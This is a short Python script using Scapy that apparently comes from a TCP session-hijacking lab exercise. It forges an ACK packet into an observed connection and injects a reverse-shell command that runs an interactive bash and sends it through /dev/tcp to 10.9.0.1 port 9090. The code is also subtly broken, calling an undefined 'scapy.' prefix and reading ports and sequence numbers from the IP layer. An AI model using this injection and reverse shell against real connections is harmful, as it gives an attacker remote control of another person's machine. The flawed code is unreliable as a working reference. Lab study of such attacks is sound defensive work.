#!/usr/bin/env python3
from scapy.all import *

# this is just a test script, it won't be used in the final version


def callback(pkt):
    ip = scapy.IP(src=pkt[scapy.IP].src, dst=pkt[scapy.IP].dst)
    tcp = scapy.TCP(sport=pkt[scapy.IP].sport, dport=pkt[scapy.IP].dport,
                    flags="A", seq=pkt[scapy.IP].seq, ack=pkt[scapy.IP].ack)
    data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
    pkt = ip/tcp/data
    ls(pkt)
    send(pkt, verbose=0)
